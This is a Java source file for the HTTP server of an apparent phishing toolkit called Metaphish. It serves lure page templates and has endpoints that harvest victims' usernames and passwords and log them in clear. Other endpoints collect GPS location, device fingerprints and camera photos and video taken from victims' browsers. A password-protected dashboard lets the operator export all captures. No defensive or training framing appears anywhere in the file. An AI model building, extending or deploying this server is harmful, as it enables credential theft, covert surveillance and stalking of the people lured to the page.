package com.metaphish.server;

import com.metaphish.config.AppConfig;
import com.metaphish.module.DataCapture;
import com.metaphish.module.ExportManager;
import com.metaphish.module.FormCapture;
import com.metaphish.module.ReportGenerator;
import com.metaphish.service.DeviceProfiler;
import com.metaphish.service.IpGeolocation;
import com.metaphish.util.JsonUtil;
import com.metaphish.util.Logger;
import com.metaphish.util.SessionManager;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpsConfigurator;
import com.sun.net.httpserver.HttpsParameters;
import com.sun.net.httpserver.HttpsServer;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLParameters;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;

public final class MetaphishServer {
    private final AppConfig Config;
    private final DataCapture DeviceCaptureStore;
    private final FormCapture FormCaptureStore;
    private final IpGeolocation GeoLookup;
    private final ExportManager Exporter;
    private final ReportGenerator Reporter;
    private HttpServer Server;
    private final DateTimeFormatter TimestampFormatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    private int CaptureCounter = 0;

    public MetaphishServer(AppConfig Config) {
        this.Config = Config;
        this.DeviceCaptureStore = new DataCapture(Config.CaptureFilePath);
        this.FormCaptureStore = new FormCapture(Config.FormCaptureFilePath);
        this.GeoLookup = new IpGeolocation(Config.ApiTimeoutSeconds);
        this.Exporter = new ExportManager(DeviceCaptureStore, FormCaptureStore, Config.ReportDirectory);
        this.Reporter = new ReportGenerator(DeviceCaptureStore, FormCaptureStore, Config.ReportDirectory, Config.ImagesDirectory);
    }

    public void Start() throws Exception {
        InetSocketAddress Address = new InetSocketAddress(Config.ServerHost, Config.ServerPort);

        if (Config.SslEnabled) {
            SslManager SslMgr = new SslManager(Config.SslKeystorePath, Config.SslKeystorePassword);
            SSLContext SslContext = SslMgr.BuildContext();
            HttpsServer SecureServer = HttpsServer.create(Address, 0);
            SecureServer.setHttpsConfigurator(new HttpsConfigurator(SslContext) {
                @Override
                public void configure(HttpsParameters Params) {
                    SSLContext Context = getSSLContext();
                    SSLParameters Defaults = Context.getDefaultSSLParameters();
                    Params.setSSLParameters(Defaults);
                }
            });
            Server = SecureServer;
        } else {
            Server = HttpServer.create(Address, 0);
        }

        Server.createContext("/", this::DispatchRequest);
        Server.setExecutor(Executors.newVirtualThreadPerTaskExecutor());
        Server.start();
    }

    public void Stop() {
        if (Server != null) Server.stop(1);
    }

    private void DispatchRequest(HttpExchange Exchange) throws IOException {
        String RequestPath = Exchange.getRequestURI().getPath();
        String Method = Exchange.getRequestMethod();

        try {
            if (RequestPath.equals("/") || RequestPath.equals("/index.html")) {
                HandleIndex(Exchange);
            } else if (RequestPath.equals("/capture") && Method.equals("POST")) {
                HandleDeviceCapture(Exchange);
            } else if (RequestPath.equals("/capture-image") && Method.equals("POST")) {
                HandleCameraCapture(Exchange);
            } else if (RequestPath.equals("/capture-video") && Method.equals("POST")) {
                HandleVideoCapture(Exchange);
            } else if (RequestPath.equals("/capture-form") && Method.equals("POST")) {
                HandleFormCapture(Exchange);
            } else if (RequestPath.startsWith("/images/")) {
                HandleServeImage(Exchange);
            } else if (RequestPath.startsWith("/static/")) {
                HandleServeStatic(Exchange);
            } else if (RequestPath.equals("/status") || RequestPath.equals("/status/")) {
                if (IsAuthenticated(Exchange)) {
                    HandleAdminDashboard(Exchange);
                } else {
                    Redirect(Exchange, "/status/login");
                }
            } else if (RequestPath.equals("/status/login")) {
                HandleAdminLogin(Exchange);
            } else if (RequestPath.equals("/status/logout") && Method.equals("POST")) {
                HandleAdminLogout(Exchange);
            } else if (RequestPath.equals("/status/api/stats") && IsAuthenticated(Exchange)) {
                HandleApiStats(Exchange);
            } else if (RequestPath.equals("/status/api/captures") && IsAuthenticated(Exchange)) {
                HandleApiCaptures(Exchange);
            } else if (RequestPath.equals("/status/api/forms") && IsAuthenticated(Exchange)) {
                HandleApiForms(Exchange);
            } else if (RequestPath.equals("/status/api/export-json") && IsAuthenticated(Exchange)) {
                HandleExportJson(Exchange);
            } else if (RequestPath.equals("/status/api/export-txt") && IsAuthenticated(Exchange)) {
                HandleExportTxt(Exchange);
            } else if (RequestPath.equals("/status/api/export-report") && IsAuthenticated(Exchange)) {
                HandleExportReport(Exchange);
            } else if (RequestPath.startsWith("/status/api/") && !IsAuthenticated(Exchange)) {
                SendJson(Exchange, 401, "{\"Error\":\"Unauthorized\"}");
            } else {
                SendText(Exchange, 404, "Not Found");
            }
        } catch (Exception Error) {
            Logger.Error("Handler error: " + Error.getMessage());
            SendText(Exchange, 500, "Internal Server Error");
        }
    }

    private void HandleIndex(HttpExchange Exchange) throws IOException {
        String Template = Config.DefaultTemplate.toLowerCase();
        String TemplatePath = "templates/" + Capitalize(Template) + "/Index.html";
        String Content = LoadResource(TemplatePath);
        if (Content == null) {
            SendText(Exchange, 404, "Template not found");
            return;
        }
        String ConfigScript = "<script>window.MetaphishConfig={CameraMode:\""
                + Config.CameraMode + "\",VideoSource:\"" + Config.VideoSource
                + "\",VideoDuration:" + Config.VideoDuration + "};</script>\n";
        Content = Content.replace(
            "<script src=\"/static/Tracker.js\"></script>",
            ConfigScript + "<script src=\"/static/Tracker.js\"></script>"
        );
        SendHtml(Exchange, 200, Content);
    }

    private void HandleDeviceCapture(HttpExchange Exchange) throws IOException {
        String Body = ReadBody(Exchange);
        String IpAddress = ExtractIp(Exchange);
        String UserAgent = Exchange.getRequestHeaders().getFirst("User-Agent");
        if (UserAgent == null) UserAgent = "Unknown";

        Logger.Visitor(IpAddress, UserAgent);

        LinkedHashMap<String, String> DeviceData = new LinkedHashMap<>();
        Map<String, String> Payload = JsonUtil.ParseObject(Body);
        Map<String, String> ProfileData = DeviceProfiler.Profile(UserAgent);
        Map<String, String> GeoData = GeoLookup.Lookup(IpAddress);

        DeviceData.putAll(ProfileData);
        DeviceData.putAll(GeoData);

        String[] Fields = {"GpsLatitude", "GpsLongitude", "GpsAccuracy", "GpsAltitude",
                "BatteryLevel", "BatteryCharging", "ConnectionType", "EffectiveConnectionType",
                "DownlinkMbps", "ScreenResolution", "PixelRatio", "Timezone", "Language",
                "DeviceMemoryGb", "HardwareConcurrency", "MaxTouchPoints", "CookieEnabled",
                "OnlineStatus", "PageUrl", "Referrer",
                "CameraFrontFile", "CameraBackFile", "CameraVideoFile", "CameraVideoBackFile"};

        for (String Field : Fields) {
            DeviceData.put(Field, Payload.getOrDefault(Field, "Not Available"));
        }

        DeviceData.put("Timestamp", LocalDateTime.now().format(TimestampFormatter));

        DeviceCaptureStore.Save(DeviceData);
        CaptureCounter++;
        Logger.Capture(IpAddress);
        Logger.PrintCapture(CaptureCounter, DeviceData);

        SendJson(Exchange, 200, "{\"Status\":\"Ok\"}");
    }

    private void HandleCameraCapture(HttpExchange Exchange) throws IOException {
        String ContentType = Exchange.getRequestHeaders().getFirst("Content-Type");
        String IpAddress   = ExtractIp(Exchange);
        String CameraSource = "camera";
        String QueryString  = Exchange.getRequestURI().getQuery();
        if (QueryString != null) {
            for (String Pair : QueryString.split("&")) {
                if (Pair.startsWith("source=")) {
                    String Raw = Pair.substring(7).toLowerCase();
                    if (Raw.equals("front") || Raw.equals("back")) CameraSource = Raw;
                    break;
                }
            }
        }

        if (ContentType != null && ContentType.startsWith("multipart/form-data")) {
            byte[] BodyBytes = Exchange.getRequestBody().readAllBytes();
            String Extension = ".jpg";
            String FileName = CameraSource + "_" + System.currentTimeMillis() + Extension;
            String FilePath = Config.ImagesDirectory + "/" + FileName;
            new File(Config.ImagesDirectory).mkdirs();

            int BoundaryStart = ContentType.indexOf("boundary=");
            if (BoundaryStart >= 0) {
                String Boundary = "--" + ContentType.substring(BoundaryStart + 9).trim();
                byte[] BoundaryBytes = Boundary.getBytes(StandardCharsets.UTF_8);
                int DataStart = IndexOf(BodyBytes, "\r\n\r\n".getBytes(StandardCharsets.UTF_8));
                if (DataStart >= 0) {
                    DataStart += 4;
                    int DataEnd = IndexOf(BodyBytes, BoundaryBytes, DataStart);
                    if (DataEnd < 0) DataEnd = BodyBytes.length;
                    else DataEnd -= 2;
                    byte[] ImageData = Arrays.copyOfRange(BodyBytes, DataStart, DataEnd);
                    Files.write(Path.of(FilePath), ImageData);
                    Logger.Camera(IpAddress);
                }
            }
        } else {
            byte[] ImageBytes = Exchange.getRequestBody().readAllBytes();
            String Extension = ".jpg";
            if (ContentType != null && ContentType.contains("png")) Extension = ".png";
            String FileName = CameraSource + "_" + System.currentTimeMillis() + Extension;
            new File(Config.ImagesDirectory).mkdirs();
            Files.write(Path.of(Config.ImagesDirectory + "/" + FileName), ImageBytes);
            Logger.Camera(IpAddress);
        }

        SendJson(Exchange, 200, "{\"Status\":\"Ok\"}");
    }

    private void HandleVideoCapture(HttpExchange Exchange) throws IOException {
        String IpAddress   = ExtractIp(Exchange);
        String VideoSource = "front";
        String QueryString = Exchange.getRequestURI().getQuery();
        if (QueryString != null) {
            for (String Pair : QueryString.split("&")) {
                if (Pair.startsWith("source=")) {
                    String Raw = Pair.substring(7).toLowerCase();
                    if (Raw.equals("front") || Raw.equals("back")) VideoSource = Raw;
                    break;
                }
            }
        }

        String VideoContentType = Exchange.getRequestHeaders().getFirst("Content-Type");
        String VideoExtension   = (VideoContentType != null && VideoContentType.contains("mp4")) ? ".mp4" : ".webm";
        byte[] VideoBytes       = Exchange.getRequestBody().readAllBytes();
        String FileName         = VideoSource + "_" + System.currentTimeMillis() + VideoExtension;
        new File(Config.ImagesDirectory).mkdirs();
        Files.write(Path.of(Config.ImagesDirectory + "/" + FileName), VideoBytes);
        Logger.Video(IpAddress);

        SendJson(Exchange, 200, "{\"Status\":\"Ok\"}");
    }

    private void HandleFormCapture(HttpExchange Exchange) throws IOException {
        String Body = ReadBody(Exchange);
        String IpAddress = ExtractIp(Exchange);

        Map<String, String> FormData = ParseFormBody(Body);
        LinkedHashMap<String, String> Record = new LinkedHashMap<>();

        String Username = FormData.getOrDefault("Username", FormData.getOrDefault("Email", FormData.getOrDefault("username", FormData.getOrDefault("email", ""))));
        String Password = FormData.getOrDefault("Password", FormData.getOrDefault("password", ""));

        Record.put("Username", Username);
        Record.put("Password", Password);
        Record.put("IpAddress", IpAddress);
        Record.put("Timestamp", LocalDateTime.now().format(TimestampFormatter));
        Record.putAll(GeoLookup.Lookup(IpAddress));

        FormCaptureStore.Save(Record);
        Logger.Credential(Username, Password);

        if (Config.RevealDelaySeconds > 0) {
            try { Thread.sleep(Config.RevealDelaySeconds * 1000L); } catch (InterruptedException Ignored) {}
        }

        SendJson(Exchange, 200, "{\"Status\":\"Ok\"}");
    }

    private void HandleServeImage(HttpExchange Exchange) throws IOException {
        String FileName = Exchange.getRequestURI().getPath().substring("/images/".length());
        if (FileName.contains("..") || FileName.contains("/")) {
            SendText(Exchange, 403, "Forbidden");
            return;
        }
        Path ImagePath = Path.of(Config.ImagesDirectory, FileName);
        if (!Files.exists(ImagePath)) {
            SendText(Exchange, 404, "Not Found");
            return;
        }
        byte[] Data = Files.readAllBytes(ImagePath);
        String MimeType;
        if (FileName.endsWith(".png"))       MimeType = "image/png";
        else if (FileName.endsWith(".webm")) MimeType = "video/webm";
        else if (FileName.endsWith(".mp4"))  MimeType = "video/mp4";
        else                                 MimeType = "image/jpeg";
        Exchange.getResponseHeaders().set("Content-Type", MimeType);
        Exchange.sendResponseHeaders(200, Data.length);
        try (OutputStream Out = Exchange.getResponseBody()) {
            Out.write(Data);
        }
    }

    private void HandleServeStatic(HttpExchange Exchange) throws IOException {
        String ResourceName = Exchange.getRequestURI().getPath().substring(1);
        if (ResourceName.contains("..")) {
            SendText(Exchange, 403, "Forbidden");
            return;
        }
        String Content = LoadResource(ResourceName);
        if (Content == null) {
            SendText(Exchange, 404, "Not Found");
            return;
        }
        String MimeType = "text/plain";
        if (ResourceName.endsWith(".js"))   MimeType = "application/javascript";
        else if (ResourceName.endsWith(".css"))  MimeType = "text/css";
        else if (ResourceName.endsWith(".html")) MimeType = "text/html";

        byte[] Bytes = Content.getBytes(StandardCharsets.UTF_8);
        Exchange.getResponseHeaders().set("Content-Type", MimeType + "; charset=utf-8");
        Exchange.sendResponseHeaders(200, Bytes.length);
        try (OutputStream Out = Exchange.getResponseBody()) {
            Out.write(Bytes);
        }
    }

    private void HandleAdminDashboard(HttpExchange Exchange) throws IOException {
        String Content = LoadResource("templates/Admin/Dashboard.html");
        if (Content == null) Content = "<h1>Dashboard not found</h1>";
        SendHtml(Exchange, 200, Content);
    }

    private void HandleAdminLogin(HttpExchange Exchange) throws IOException {
        String Method = Exchange.getRequestMethod();
        if (Method.equals("GET")) {
            String Content = LoadResource("templates/Admin/Login.html");
            if (Content == null) Content = "<h1>Login</h1>";
            Content = Content.replace("{{ErrorDisplay}}", "none").replace("{{ErrorMessage}}", "");
            SendHtml(Exchange, 200, Content);
            return;
        }

        if (Method.equals("POST")) {
            String Body = ReadBody(Exchange);
            Map<String, String> FormData = ParseFormBody(Body);
            String Username = FormData.getOrDefault("Username", FormData.getOrDefault("username", ""));
            String Password = FormData.getOrDefault("Password", FormData.getOrDefault("password", ""));

            if (Config.AdminUsername.equals(Username) && Config.AdminPassword.equals(Password)) {
                String Token = SessionManager.CreateSession();
                Exchange.getResponseHeaders().set("Set-Cookie", SessionManager.BuildSetCookieHeader(Token));
                Redirect(Exchange, "/status");
            } else {
                String Content = LoadResource("templates/Admin/Login.html");
                if (Content == null) Content = "<h1>Login</h1>";
                Content = Content.replace("{{ErrorDisplay}}", "block").replace("{{ErrorMessage}}", "Invalid credentials");
                SendHtml(Exchange, 401, Content);
            }
        }
    }

    private void HandleAdminLogout(HttpExchange Exchange) throws IOException {
        String Cookie = Exchange.getRequestHeaders().getFirst("Cookie");
        String Token = SessionManager.ExtractFromCookieHeader(Cookie);
        SessionManager.Invalidate(Token);
        Exchange.getResponseHeaders().set("Set-Cookie", SessionManager.BuildClearCookieHeader());
        Redirect(Exchange, "/status/login");
    }

    private void HandleApiStats(HttpExchange Exchange) throws IOException {
        int DeviceCount = DeviceCaptureStore.Count();
        int FormCount = FormCaptureStore.Count();
        int ImageCount = CountImages();
        int VideoCount = CountVideos();
        int GpsCount = CountGps();
        String Json = "{\"DeviceCaptures\":" + DeviceCount
                + ",\"FormCaptures\":" + FormCount
                + ",\"CameraImages\":" + ImageCount
                + ",\"VideoCaptures\":" + VideoCount
                + ",\"GpsLocations\":" + GpsCount + "}";
        SendJson(Exchange, 200, Json);
    }

    private void HandleApiCaptures(HttpExchange Exchange) throws IOException {
        List<Map<String, String>> Captures = DeviceCaptureStore.LoadAll();
        SendJson(Exchange, 200, JsonUtil.ToJsonArray(Captures));
    }

    private void HandleApiForms(HttpExchange Exchange) throws IOException {
        List<Map<String, String>> Forms = FormCaptureStore.LoadAll();
        SendJson(Exchange, 200, JsonUtil.ToJsonArray(Forms));
    }

    private void HandleExportJson(HttpExchange Exchange) throws IOException {
        try {
            String OutputPath = Exporter.ExportToJson();
            SendJson(Exchange, 200, "{\"Status\":\"Ok\",\"File\":\"" + OutputPath + "\"}");
            Logger.Success("JSON export saved to: " + OutputPath);
        } catch (Exception Error) {
            SendJson(Exchange, 500, "{\"Error\":\"Export failed\"}");
        }
    }

    private void HandleExportTxt(HttpExchange Exchange) throws IOException {
        try {
            String OutputPath = Exporter.ExportToTxt();
            SendJson(Exchange, 200, "{\"Status\":\"Ok\",\"File\":\"" + OutputPath + "\"}");
            Logger.Success("TXT export saved to: " + OutputPath);
        } catch (Exception Error) {
            SendJson(Exchange, 500, "{\"Error\":\"Export failed\"}");
        }
    }

    private void HandleExportReport(HttpExchange Exchange) throws IOException {
        try {
            String OutputPath = Reporter.Generate();
            SendJson(Exchange, 200, "{\"Status\":\"Ok\",\"File\":\"" + OutputPath + "\"}");
            Logger.Success("HTML report saved to: " + OutputPath);
        } catch (Exception Error) {
            SendJson(Exchange, 500, "{\"Error\":\"Report failed\"}");
        }
    }

    private boolean IsAuthenticated(HttpExchange Exchange) {
        String Cookie = Exchange.getRequestHeaders().getFirst("Cookie");
        String Token = SessionManager.ExtractFromCookieHeader(Cookie);
        return SessionManager.IsValid(Token);
    }

    private void Redirect(HttpExchange Exchange, String Location) throws IOException {
        Exchange.getResponseHeaders().set("Location", Location);
        Exchange.sendResponseHeaders(302, -1);
        Exchange.close();
    }

    private void SendHtml(HttpExchange Exchange, int StatusCode, String Content) throws IOException {
        byte[] Bytes = Content.getBytes(StandardCharsets.UTF_8);
        Exchange.getResponseHeaders().set("Content-Type", "text/html; charset=utf-8");
        Exchange.sendResponseHeaders(StatusCode, Bytes.length);
        try (OutputStream Out = Exchange.getResponseBody()) {
            Out.write(Bytes);
        }
    }

    private void SendJson(HttpExchange Exchange, int StatusCode, String Json) throws IOException {
        byte[] Bytes = Json.getBytes(StandardCharsets.UTF_8);
        Exchange.getResponseHeaders().set("Content-Type", "application/json; charset=utf-8");
        Exchange.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
        Exchange.sendResponseHeaders(StatusCode, Bytes.length);
        try (OutputStream Out = Exchange.getResponseBody()) {
            Out.write(Bytes);
        }
    }

    private void SendText(HttpExchange Exchange, int StatusCode, String Text) throws IOException {
        byte[] Bytes = Text.getBytes(StandardCharsets.UTF_8);
        Exchange.getResponseHeaders().set("Content-Type", "text/plain; charset=utf-8");
        Exchange.sendResponseHeaders(StatusCode, Bytes.length);
        try (OutputStream Out = Exchange.getResponseBody()) {
            Out.write(Bytes);
        }
    }

    private String ReadBody(HttpExchange Exchange) throws IOException {
        try (InputStream Stream = Exchange.getRequestBody()) {
            return new String(Stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private String ExtractIp(HttpExchange Exchange) {
        String ForwardedFor = Exchange.getRequestHeaders().getFirst("X-Forwarded-For");
        if (ForwardedFor != null && !ForwardedFor.isBlank()) {
            return ForwardedFor.split(",")[0].trim();
        }
        return Exchange.getRemoteAddress().getAddress().getHostAddress();
    }

    private String LoadResource(String RelativePath) {
        try (InputStream Stream = getClass().getClassLoader().getResourceAsStream(RelativePath)) {
            if (Stream == null) {
                Path FilePath = Path.of(RelativePath);
                if (Files.exists(FilePath)) {
                    return Files.readString(FilePath, StandardCharsets.UTF_8);
                }
                return null;
            }
            return new String(Stream.readAllBytes(), StandardCharsets.UTF_8);
        } catch (IOException Ignored) {
            return null;
        }
    }

    private Map<String, String> ParseFormBody(String Body) {
        Map<String, String> Result = new LinkedHashMap<>();
        if (Body == null || Body.isBlank()) return Result;

        if (Body.trim().startsWith("{")) {
            return JsonUtil.ParseObject(Body);
        }

        for (String Part : Body.split("&")) {
            int EqualSign = Part.indexOf('=');
            if (EqualSign < 0) continue;
            String Key = UrlDecode(Part.substring(0, EqualSign));
            String Value = UrlDecode(Part.substring(EqualSign + 1));
            Result.put(Key, Value);
        }
        return Result;
    }

    private String UrlDecode(String Text) {
        try {
            return java.net.URLDecoder.decode(Text, StandardCharsets.UTF_8);
        } catch (Exception Ignored) {
            return Text;
        }
    }

    private String Capitalize(String Text) {
        if (Text == null || Text.isEmpty()) return Text;
        return Character.toUpperCase(Text.charAt(0)) + Text.substring(1).toLowerCase();
    }

    private int CountImages() {
        File ImagesDir = new File(Config.ImagesDirectory);
        if (!ImagesDir.exists()) return 0;
        String[] FileList = ImagesDir.list((Dir, Name) ->
                Name.endsWith(".jpg") || Name.endsWith(".png") || Name.endsWith(".jpeg"));
        return FileList != null ? FileList.length : 0;
    }

    private int CountVideos() {
        File ImagesDir = new File(Config.ImagesDirectory);
        if (!ImagesDir.exists()) return 0;
        String[] FileList = ImagesDir.list((Dir, Name) -> Name.endsWith(".webm") || Name.endsWith(".mp4"));
        return FileList != null ? FileList.length : 0;
    }

    private int CountGps() {
        List<Map<String, String>> Devices = DeviceCaptureStore.LoadAll();
        int Count = 0;
        for (Map<String, String> Device : Devices) {
            String Lat = Device.getOrDefault("GpsLatitude", "");
            if (!Lat.isEmpty() && !Lat.equals("Permission Denied") && !Lat.equals("Not Available")) Count++;
        }
        return Count;
    }

    private int IndexOf(byte[] Source, byte[] Target) {
        return IndexOf(Source, Target, 0);
    }

    private int IndexOf(byte[] Source, byte[] Target, int Start) {
        outer:
        for (int Idx = Start; Idx <= Source.length - Target.length; Idx++) {
            for (int Inner = 0; Inner < Target.length; Inner++) {
                if (Source[Idx + Inner] != Target[Inner]) continue outer;
            }
            return Idx;
        }
        return -1;
    }
}
